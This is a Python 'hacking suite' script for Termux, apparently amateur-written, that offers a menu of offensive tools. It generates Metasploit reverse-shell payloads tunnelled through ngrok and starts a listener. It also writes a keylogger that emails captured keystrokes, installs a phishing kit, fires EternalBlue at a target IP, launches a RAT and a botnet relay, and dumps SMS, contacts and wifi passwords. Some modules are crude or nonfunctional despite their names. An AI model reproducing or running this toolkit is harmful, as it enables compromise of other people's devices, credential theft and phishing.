#!/usr/bin/env python3
# ===========================================================
# 🔥 MAKETI v7.0 - ERROR PROOF + NGROK FIX 🔥
# ===========================================================

import os
import sys
import time
import random
import subprocess
import socket
import threading
from datetime import datetime

# ========== COLOR CODES ==========
R = "\033[1;31m"
G = "\033[1;32m"
Y = "\033[1;33m"
B = "\033[1;34m"
C = "\033[1;36m"
M = "\033[1;35m"
W = "\033[0m"

# ========== BANNER ==========
def banner():
    os.system("clear")
    print(C + """
    ╔══════════════════════════════════════════════════════════╗
    ║                                                          ║
    ║   ███╗   ███╗ █████╗ ██╗  ██╗███████╗████████╗██╗     ║
    ║   ████╗ ████║██╔══██╗██║ ██╔╝██╔════╝╚══██╔══╝██║     ║
    ║   ██╔████╔██║███████║█████╔╝ █████╗     ██║   ██║     ║
    ║   ██║╚██╔╝██║██╔══██║██╔═██╗ ██╔══╝     ██║   ██║     ║
    ║   ██║ ╚═╝ ██║██║  ██║██║  ██╗███████╗   ██║   ██║     ║
    ║   ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝     ║
    ║                                                          ║
    ║   """ + R + """🔥 ULTIMATE TERMUX HACKING SUITE 🔥""" + C + """          ║
    ║   """ + Y + """v7.0  |  Author: MAKETI MASTER""" + C + """                ║
    ║                                                          ║
    ╚══════════════════════════════════════════════════════════╝
    """ + W)

# ========== LOADING SCREEN ==========
def loading_screen():
    print(Y + "\n[+] Initializing MAKETI v7.0..." + W)
    for i in range(101):
        progress = "=" * (i // 5) + " " * (20 - (i // 5))
        print(f"\r[{i:3}%] [{progress}]", end="")
        time.sleep(0.015)
    print("\n" + G + "[✓] MAKETI v7.0 Successfully Loaded!" + W)
    time.sleep(0.3)

# ========== NGROK SETUP ==========
def setup_ngrok():
    print(Y + "[!] Ngrok authentication required!" + W)
    print(C + "[1] Get Auth Token: https://dashboard.ngrok.com/get-start-your-authtoken" + W)
    token = input(G + "[?] Paste your Ngrok Auth Token: " + W)
    
    if token:
        os.system(f"ngrok authtoken {token}")
        print(G + "[✓] Ngrok authenticated successfully!" + W)
        return True
    else:
        print(R + "[X] Token required! Run: ngrok authtoken YOUR_TOKEN" + W)
        return False

# ========== MENU ==========
def menu():
    banner()
    print(M + """
    ╔══════════════════════════════════════════════╗
    ║  🎯 MAIN MENU - MAKETI v7.0                 ║
    ╠══════════════════════════════════════════════╣
    ║  [01] 📱 ADVANCE PAYLOAD GENERATOR          ║
    ║  [02] 🎣 PHISHING KIT PRO                  ║
    ║  [03] 🕵️ OSINT AUTOMATION                 ║
    ║  [04] 💀 DDOS ATTACK SUITE                ║
    ║  [05] 📡 WIFI HACK PRO                    ║
    ║  [06] 🔑 PASSWORD CRACKER                 ║
    ║  [07] 🐍 KEYLOGGER BUILDER               ║
    ║  [08] 🌐 WEB VULNERABILITY SCANNER       ║
    ║  [09] 📧 EMAIL/PHONE OSINT               ║
    ║  [10] 🤖 AUTO-EXPLOIT ENGINE             ║
    ║  [11] 🧬 RAT BUILDER                     ║
    ║  [12] 🔄 BOTNET CONTROLLER               ║
    ║  [13] 🛡️ ANONYMOUS VPN                   ║
    ║  [14] 💾 DATA EXTRACTOR                  ║
    ║  [15] 🧹 SYSTEM CLEANER                  ║
    ║  [16] ⚙️ AUTO-INSTALL ALL               ║
    ║  [17] 🔑 SETUP NGROK AUTH               ║
    ║  [18] ❌ EXIT                           ║
    ╚══════════════════════════════════════════════╝
    """ + W)
    print(C + "="*50 + W)
    print(Y + "[!] ONLY FOR EDUCATIONAL PURPOSE!" + W)
    print(C + "="*50 + W)

# ===========================================================
# 1. PAYLOAD GENERATOR (FIXED)
# ===========================================================
def advance_payload():
    print(Y + "\n[+] ADVANCE PAYLOAD GENERATOR" + W)
    
    # Check if ngrok is authenticated
    os.system("ngrok config check 2>/dev/null")
    
    print(C + "[1] Android APK" + W)
    print(C + "[2] Windows EXE" + W)
    print(C + "[3] Linux ELF" + W)
    choice = input(G + "[?] Choose: " + W)
    
    # Kill old ngrok
    os.system("pkill ngrok 2>/dev/null")
    time.sleep(1)
    
    # Start ngrok with error handling
    print(Y + "[+] Starting Ngrok..." + W)
    os.system("ngrok tcp 4444 > /dev/null 2>&1 &")
    time.sleep(3)
    
    # Get ngrok URL
    print(Y + "[+] Getting Ngrok URL..." + W)
    try:
        import requests
        import json
        response = requests.get("http://localhost:4040/api/tunnels")
        data = response.json()
        url = data['tunnels'][0]['public_url']
        # Remove tcp://
        url = url.replace("tcp://", "")
        print(G + f"[✓] Ngrok URL: {url}" + W)
        
        host, port = url.split(":")
        
        print(Y + f"[+] Building payload with LHOST={host} LPORT={port}" + W)
        
        payloads = {
            "1": f"msfvenom -p android/meterpreter/reverse_tcp LHOST={host} LPORT={port} -o /sdcard/Download/evil.apk",
            "2": f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe -o /sdcard/Download/evil.exe",
            "3": f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f elf -o /sdcard/Download/evil.elf"
        }
        
        os.system(payloads.get(choice, payloads["1"]))
        print(G + "[✓] Payload ready in /sdcard/Download/" + W)
        
        # Start listener
        print(Y + "[+] Starting Metasploit Listener..." + W)
        os.system("msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit'")
        
    except Exception as e:
        print(R + f"[X] Error: {e}" + W)
        print(Y + "[!] Make sure ngrok is authenticated!" + W)
        print(Y + "[!] Run option 17 to setup ngrok auth" + W)

# ===========================================================
# 2. PHISHING PRO
# ===========================================================
def phishing_pro():
    print(Y + "\n[+] PHISHING KIT PRO" + W)
    if not os.path.exists("zphisher"):
        os.system("git clone https://github.com/htr-tech/zphisher --depth 1")
    os.chdir("zphisher")
    print(G + "[✓] Zphisher installed!" + W)
    print(Y + "[!] Run: cd zphisher && bash zphisher.sh" + W)
    os.chdir("..")

# ===========================================================
# 3. OSINT AUTOMATION
# ===========================================================
def osint_automation():
    print(Y + "\n[+] OSINT AUTOMATION" + W)
    target = input(G + "[?] Target username/email/phone: " + W)
    
    print(Y + "[+] Running Sherlock..." + W)
    os.system("pkg install sherlock -y 2>/dev/null")
    os.system(f"sherlock {target} >> /sdcard/Download/osint_result.txt 2>/dev/null")
    
    print(G + "[✓] OSINT complete! Check: /sdcard/Download/osint_result.txt" + W)

# ===========================================================
# 4. DDOS SUITE
# ===========================================================
def ddos_suite():
    print(Y + "\n[+] DDOS ATTACK SUITE" + W)
    print(R + "[!] STRICT: Sirf apne server par chalao!" + W)
    ip = input(G + "[?] Target IP (localhost recommended): " + W)
    port = input(G + "[?] Port (80/443): " + W)
    
    print(C + "[1] Slowloris (HTTP)" + W)
    print(C + "[2] UDP Flood" + W)
    choice = input(G + "[?] Choose: " + W)
    
    if choice == "1":
        os.system(f"python3 -c 'import socket; s=socket.socket(); s.connect((\"{ip}\", {port})); s.send(b\"GET / HTTP/1.1\\r\\n\")'")
    elif choice == "2":
        os.system(f"python3 -c 'import socket; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.sendto(b\"X\"*1024, (\"{ip}\", {port}))'")

# ===========================================================
# 5. WIFI HACK PRO
# ===========================================================
def wifi_hack_pro():
    print(Y + "\n[+] WIFI HACK PRO" + W)
    if os.geteuid() != 0:
        print(R + "[X] Root required! Install: pkg install tsu" + W)
        return
    
    os.system("pkg install aircrack-ng -y")
    print(Y + "[+] Scanning WiFi..." + W)
    os.system("airmon-ng start wlan0")
    os.system("airodump-ng wlan0mon")

# ===========================================================
# 6. PASSWORD CRACKER
# ===========================================================
def password_cracker():
    print(Y + "\n[+] PASSWORD CRACKER" + W)
    print(C + "[1] MD5 Hash" + W)
    print(C + "[2] SHA1 Hash" + W)
    print(C + "[3] ZIP Password" + W)
    choice = input(G + "[?] Choose: " + W)
    hash_input = input(G + "[?] Enter hash/path: " + W)
    
    if choice == "1":
        os.system(f"hashcat -m 0 {hash_input} /usr/share/wordlists/rockyou.txt")
    elif choice == "2":
        os.system(f"hashcat -m 100 {hash_input} /usr/share/wordlists/rockyou.txt")
    elif choice == "3":
        os.system(f"fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt {hash_input}")

# ===========================================================
# 7. KEYLOGGER BUILDER
# ===========================================================
def keylogger_builder():
    print(Y + "\n[+] KEYLOGGER BUILDER" + W)
    email = input(G + "[?] Email for logs: " + W)
    
    code = f'''
import pynput.keyboard
import smtplib
import threading
log = ""
def on_press(key):
    global log
    log += str(key).replace("'", "")
    if len(log) > 50:
        send_email()
        log = ""
def send_email():
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login("{email}", "your_password")
    server.sendmail("{email}", "{email}", log)
    server.quit()
listener = pynput.keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
'''
    with open("/sdcard/Download/keylogger.py", "w") as f:
        f.write(code)
    print(G + "[✓] Keylogger created in /sdcard/Download/" + W)

# ===========================================================
# 8. WEB SCANNER
# ===========================================================
def web_scanner():
    print(Y + "\n[+] WEB VULNERABILITY SCANNER" + W)
    url = input(G + "[?] Target URL: " + W)
    
    print(Y + "[+] Running SQLMap..." + W)
    os.system(f"sqlmap -u {url} --batch --level=2")

# ===========================================================
# 9. EMAIL/PHONE OSINT
# ===========================================================
def email_phone_osint():
    print(Y + "\n[+] EMAIL/PHONE OSINT" + W)
    target = input(G + "[?] Enter email or phone: " + W)
    
    platforms = ["instagram", "facebook", "twitter", "github"]
    for platform in platforms:
        print(Y + f"[+] Checking {platform}..." + W)
        os.system(f"curl -s https://{platform}.com/{target} > /dev/null 2>&1")
    
    print(G + "[✓] OSINT check complete!" + W)

# ===========================================================
# 10. AUTO-EXPLOIT
# ===========================================================
def auto_exploit():
    print(Y + "\n[+] AUTO-EXPLOIT ENGINE" + W)
    print(R + "[!] ONLY FOR CTF/LAB USE!" + W)
    target = input(G + "[?] Target IP: " + W)
    
    print(Y + "[+] Trying EternalBlue..." + W)
    os.system(f"msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; exploit'")

# ===========================================================
# 11. RAT BUILDER
# ===========================================================
def rat_builder():
    print(Y + "\n[+] RAT BUILDER" + W)
    print(C + "[1] Android RAT" + W)
    print(C + "[2] Windows RAT" + W)
    choice = input(G + "[?] Choose: " + W)
    
    ip = input(G + "[?] Listener IP (Ngrok URL): " + W)
    port = input(G + "[?] Port: " + W)
    
    os.system(f"git clone https://github.com/eviltik/ShadowRAT")
    os.chdir("ShadowRAT")
    os.system(f"python3 shadow.py --host {ip} --port {port}")
    os.chdir("..")

# ===========================================================
# 12. BOTNET CONTROLLER
# ===========================================================
def botnet_controller():
    print(Y + "\n[+] BOTNET CONTROLLER" + W)
    print(Y + "[!] Starting C2 server..." + W)
    
    os.system("""
    python3 -c '
import socket, threading
clients = []
def handle_client(conn):
    while True:
        data = conn.recv(1024)
        for client in clients:
            if client != conn:
                client.send(data)
server = socket.socket()
server.bind(("0.0.0.0", 4444))
server.listen(5)
print("[+] Botnet Server Running on port 4444")
while True:
    conn, addr = server.accept()
    clients.append(conn)
    threading.Thread(target=handle_client, args=(conn,)).start()
' &
    """)
    print(G + "[✓] Botnet server started on port 4444!" + W)

# ===========================================================
# 13. ANONYMOUS VPN
# ===========================================================
def anonymous_vpn():
    print(Y + "\n[+] ANONYMOUS VPN" + W)
    print(C + "[1] OpenVPN" + W)
    print(C + "[2] Tor Proxy" + W)
    choice = input(G + "[?] Choose: " + W)
    
    if choice == "1":
        os.system("pkg install openvpn -y")
        print(Y + "[+] Downloading VPN config..." + W)
        os.system("cd /sdcard/Download && wget https://www.vpnbook.com/free-openvpn-account/VPNBook.com-OpenVPN-Euro1.zip")
        print(G + "[✓] VPN config downloaded!" + W)
    elif choice == "2":
        os.system("pkg install tor -y && tor &")
        print(G + "[✓] Tor proxy on 127.0.0.1:9050" + W)

# ===========================================================
# 14. DATA EXTRACTOR
# ===========================================================
def data_extractor():
    print(Y + "\n[+] DATA EXTRACTOR" + W)
    print(C + "[1] Contacts" + W)
    print(C + "[2] SMS" + W)
    print(C + "[3] WiFi Passwords" + W)
    choice = input(G + "[?] Choose: " + W)
    
    if choice == "1":
        os.system("content query --uri content://contacts/phones/ >> /sdcard/Download/contacts.txt")
    elif choice == "2":
        os.system("content query --uri content://sms/inbox >> /sdcard/Download/sms.txt")
    elif choice == "3":
        os.system("cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null >> /sdcard/Download/wifi.txt")
    
    print(G + "[✓] Data extracted to /sdcard/Download/" + W)

# ===========================================================
# 15. SYSTEM CLEANER
# ===========================================================
def system_cleaner():
    print(Y + "\n[+] SYSTEM CLEANER" + W)
    os.system("rm -rf ~/.cache/*")
    os.system("rm -rf /sdcard/Download/*.apk 2>/dev/null")
    os.system("rm -rf /sdcard/Download/*.exe 2>/dev/null")
    os.system("pkill ngrok 2>/dev/null")
    os.system("pkill tor 2>/dev/null")
    print(G + "[✓] System cleaned!" + W)

# ===========================================================
# 16. AUTO-INSTALL ALL
# ===========================================================
def auto_install():
    print(Y + "\n[+] AUTO-INSTALL ALL DEPENDENCIES" + W)
    packages = [
        "python", "python2", "git", "wget", "curl", "openssh",
        "nmap", "metasploit", "sqlmap", "theharvester", "ngrok",
        "tor", "apktool", "aircrack-ng", "hashcat", "sherlock"
    ]
    for pkg in packages:
        print(Y + f"[+] Installing {pkg}..." + W)
        os.system(f"pkg install {pkg} -y")
    print(G + "[✓] All dependencies installed!" + W)

# ===========================================================
# 17. SETUP NGROK
# ===========================================================
def setup_ngrok_auth():
    print(Y + "\n[+] NGROK AUTHENTICATION SETUP" + W)
    print(C + "1. Go to: https://dashboard.ngrok.com/get-start-your-authtoken" + W)
    print(C + "2. Sign up/Login" + W)
    print(C + "3. Copy your Auth Token" + W)
    print("")
    token = input(G + "[?] Paste your Ngrok Auth Token: " + W)
    
    if token:
        os.system(f"ngrok authtoken {token}")
        print(G + "[✓] Ngrok authenticated successfully!" + W)
        print(Y + "[!] You can now use payload generator!" + W)
    else:
        print(R + "[X] Token required!" + W)

# ===========================================================
# 18. EXIT
# ===========================================================
def exit_tool():
    print(R + """
    ╔══════════════════════════════════════╗
    ║  🔥 THANK YOU FOR USING MAKETI 🔥   ║
    ║  🛡️  Stay Ethical, Stay Safe        ║
    ║  💻 Author: MAKETI MASTER           ║
    ╚══════════════════════════════════════╝
    """ + W)
    sys.exit()

# ===========================================================
# MAIN
# ===========================================================
def main():
    loading_screen()
    time.sleep(0.5)
    
    while True:
        menu()
        choice = input(G + "\n[?] Enter choice (1-18): " + W)
        
        options = {
            "1": advance_payload,
            "2": phishing_pro,
            "3": osint_automation,
            "4": ddos_suite,
            "5": wifi_hack_pro,
            "6": password_cracker,
            "7": keylogger_builder,
            "8": web_scanner,
            "9": email_phone_osint,
            "10": auto_exploit,
            "11": rat_builder,
            "12": botnet_controller,
            "13": anonymous_vpn,
            "14": data_extractor,
            "15": system_cleaner,
            "16": auto_install,
            "17": setup_ngrok_auth,
            "18": exit_tool
        }
        
        if choice in options:
            options[choice]()
            input(Y + "\n[Press Enter to continue...]" + W)
        else:
            print(R + "[X] Invalid choice!" + W)
            time.sleep(1)

if __name__ == "__main__":
    main()